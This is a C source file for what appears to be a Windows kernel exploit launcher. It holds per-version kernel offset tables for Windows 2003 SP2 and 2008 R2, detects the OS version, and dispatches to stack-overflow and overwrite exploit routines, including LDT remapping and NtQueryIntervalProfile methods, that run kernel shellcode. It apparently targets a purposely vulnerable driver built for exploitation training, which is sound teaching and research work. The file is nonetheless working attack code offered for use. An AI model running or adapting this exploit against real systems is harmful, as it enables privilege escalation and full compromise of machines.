#include <windows.h>
#include <winioctl.h>
#include <Sddl.h>
#include <wchar.h>
#include <stdio.h>
#include "KernelExploit.h"
#include "KernelArch.h"

KERN_OFFSET_ENTRY TargetsTable[] = 
{
  { L"Windows 2003 SP2 32-bit", 5, 2, 2, 0, ARCH_IX86,   { 0x68, 0x4C, 0x6C, 0x50, 0x74, 0x54,       0xD4} },
  { L"Windows 2008 R2 64-bit",  6, 1, 0, 0, ARCH_X86_64, { 0x90, 0x78, 0x98, 0x7c, 0x40, UNUSED_OFF, UNUSED_OFF} }
};


PKERN_OFFSET_ENTRY GetTarget(DWORD arch)
{
  DWORD major,minor,majorSP,minorSP;
  PKERN_OFFSET_ENTRY entry;
  INT i;

  GetOSVersion(&major, &minor, &majorSP, &minorSP);
  wprintf(L"Version Detected: %d.%d SP %d.%d\n", major, minor, majorSP, minorSP);
  for(i=0, entry = &TargetsTable[0]; i < sizeof(TargetsTable)/sizeof(KERN_OFFSET_ENTRY); entry++, i++)
  {
    if(entry->arch    == arch    && 
       entry->major   == major   &&
       entry->minor   == minor   &&
       entry->majorSP == majorSP &&
       entry->minorSP == minorSP)
        return entry;
  }

  return NULL;
}



int wmain( int argc, wchar_t *argv[], wchar_t *envp[] )
{
  BOOL Wow64 = FALSE;
  GetSystemInfo(&GlobalInfo);
  

  if(argc < 2)
  {
    wprintf(L"[-] You must supply one of those:\n\t"
#if defined(_M_AMD64)
            L"--exploit-stack-overflow-64\n"
#elif defined (_M_IX86) 
            L"--exploit-overwrite-ldtway-32\n\t"
            L"--exploit-overwrite-profile-32\n\t"
            L"--exploit-stack-overflow-32\n\t" 
#endif

    );

    ExitProcess(1);
  }


#if defined(_M_AMD64)
  
  TargetHost = GetTarget(ARCH_X86_64);
  if(TargetHost == NULL)
  {
    wprintf(L"[-] Unable to find a valid target\n");
    ExitProcess(1);
  }

  if(!wcscmp(argv[1], L"--exploit-stack-overflow-64"))
  {   
    if(LoadAndGetKernelBase() == FALSE)
    {
      wprintf(L"[!] Unable to get Kernel Base\n");
      ExitProcess(1);
    }

    if(hardcodedReturn == NULL)
    {
      wprintf(L"[!] Unable to get return offset, have you changed the driver code? or are you using a different WDK version?\n");
      ExitProcess(1);
    }

    wprintf(L"[-] Return address detected: %p\n", (PVOID)hardcodedReturn); 
    TriggerOverflow64();
  }
  else 
  {
    wprintf(L"[-] Unknown option\n");
    ExitProcess(1);
  }

#elif defined (_M_IX86) 
  
    
  IsWow64Process(GetCurrentProcess(), &Wow64);
  if(Wow64)
  {
    wprintf(L"[-] Process is running over a x64 kernel. Since most of the shellcode is written in C\n"
            L"    you need to re-compile the exploit as a x64 binary to generate x64 kernel shellcode\n");
    ExitProcess(1);
  }

  TargetHost = GetTarget(ARCH_IX86);
  if(TargetHost == NULL)
  {
    wprintf(L"[-] Unable to find a valid target\n");
    ExitProcess(1);
  } 
  else
    wprintf(L"[-] Available Target: %s\n", TargetHost->name);

  if(!wcscmp(argv[1], L"--exploit-overwrite-ldtway-32"))
  {
    TriggerOverwrite32_LDTRemappingWay();
  }
  else if(!wcscmp(argv[1], L"--exploit-overwrite-profile-32"))
  {
    TriggerOverwrite32_NtQueryIntervalProfileWay();
  }
  else if(!wcscmp(argv[1], L"--exploit-stack-overflow-32"))
  {
    TriggerOverflow32();
  }
  else 
  {
    wprintf(L"[-] Unknown option\n");
    ExitProcess(1);
  }

#endif

return 0;
}
